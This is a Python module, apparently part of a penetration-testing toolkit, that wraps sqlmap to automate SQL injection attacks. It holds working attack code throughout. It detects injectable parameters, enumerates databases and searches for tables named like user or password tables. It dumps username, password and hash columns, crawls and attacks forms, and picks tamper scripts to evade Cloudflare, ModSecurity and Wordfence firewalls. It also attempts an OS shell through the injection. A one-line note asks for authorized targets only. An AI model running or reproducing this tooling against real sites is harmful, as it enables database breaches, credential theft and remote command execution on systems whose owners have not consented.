"""
sqlmap wrapper with smart automation:
  - Auto-extracts DBs → tables → interesting columns in one run
  - Detects login forms and tests them automatically
  - WAF evasion tamper scripts selected based on detected WAF
  - Dumps user/password tables automatically when found
"""

from typing import AsyncGenerator
from core.runner import CommandRunner
from core.danger import DangerLevel
from ui.widgets.help_panel import ToolHelp

HELP = ToolHelp(
    name="SQL Injection (sqlmap)",
    description=(
        "Automated SQLi detection and exploitation. "
        "Auto-enumerates databases, tables, and dumps credential tables. "
        "WAF evasion tampers applied automatically based on detected WAF."
    ),
    usage="Provide full URL with parameter (e.g. https://site.com/page?id=1). Or let it find forms.",
    danger_note="🟠 Medium Risk — modifies/reads DB data. Only on authorized targets.",
    example="sqlmap -u 'https://target.com/page?id=1' --batch --dbs",
)

DANGER = DangerLevel.ORANGE

WAF_TAMPERS = {
    "cloudflare": "space2comment,between,randomcase",
    "modsecurity": "space2comment,between,charunicodeescape",
    "wordfence":  "space2comment,randomcase",
    "default":    "space2comment",
}

CRED_TABLE_HINTS = ["user", "users", "admin", "accounts", "member", "login", "passwd", "password"]


class SQLInjector:
    def __init__(self):
        self._runner = CommandRunner()

    def _base_cmd(self, url: str, waf: str = "", extra: list[str] = None) -> list[str]:
        tamper = WAF_TAMPERS.get(waf.lower(), WAF_TAMPERS["default"]) if waf else ""
        cmd = [
            "sqlmap",
            "-u", url,
            "--batch",
            "--random-agent",
            "--level=3",
            "--risk=2",
            "--timeout=10",
            "--retries=2",
        ]
        if tamper:
            cmd += [f"--tamper={tamper}"]
        if extra:
            cmd += extra
        return cmd

    async def detect(self, url: str, waf: str = "") -> AsyncGenerator[str, None]:
        yield f"[*] SQLi detection: {url}"
        cmd = self._base_cmd(url, waf, ["--dbs"])
        dbs_found = []

        async for line in self._runner.run(cmd):
            if "available databases" in line.lower():
                yield f"[+] {line.strip()}"
            elif line.strip().startswith("[*]") and "available" not in line:
                yield f"[+] DB: {line.strip()}"
                dbs_found.append(line.strip())
            elif "injectable" in line.lower() or "parameter" in line.lower():
                yield f"[!] {line.strip()}"
            elif "[ERROR]" in line or "[WARNING]" in line:
                yield line.strip()
            elif line.strip():
                yield line

        if dbs_found:
            yield f"\n[+] Found {len(dbs_found)} database(s)"

    async def dump_creds(self, url: str, db: str = "", waf: str = "") -> AsyncGenerator[str, None]:
        yield f"[*] Hunting credential tables in {db or 'all DBs'}..."
        extra = ["--tables"]
        if db:
            extra += ["-D", db]

        tables = []
        async for line in CommandRunner().run(self._base_cmd(url, waf, extra)):
            line_lower = line.lower()
            for hint in CRED_TABLE_HINTS:
                if hint in line_lower and line.strip().startswith("|"):
                    table = line.strip().strip("|").strip()
                    if table not in tables:
                        tables.append(table)
                        yield f"[+] Credential table candidate: {table}"
            if line.strip():
                yield line

        for table in tables[:3]:  # dump top 3 candidates
            yield f"\n[*] Dumping table: {table}"
            dump_extra = ["-T", table, "-C", "username,password,email,user,pass,hash,passwd", "--dump"]
            if db:
                dump_extra += ["-D", db]
            async for line in CommandRunner().run(self._base_cmd(url, waf, dump_extra)):
                if "|" in line:
                    yield f"[DATA] {line.strip()}"
                elif line.strip():
                    yield line

    async def forms_attack(self, url: str, waf: str = "") -> AsyncGenerator[str, None]:
        yield f"[*] Auto-detecting and testing forms at: {url}"
        cmd = self._base_cmd(url, waf, ["--forms", "--dbs", "--crawl=2"])
        async for line in self._runner.run(cmd):
            yield line

    async def os_shell(self, url: str, waf: str = "") -> AsyncGenerator[str, None]:
        yield "[!] Attempting OS shell via SQL injection..."
        yield "[!] Requires stacked queries (MSSQL/PostgreSQL) or FILE privilege (MySQL)"
        cmd = self._base_cmd(url, waf, ["--os-shell"])
        async for line in self._runner.run(cmd):
            yield line

    async def stop(self):
        await self._runner.stop()
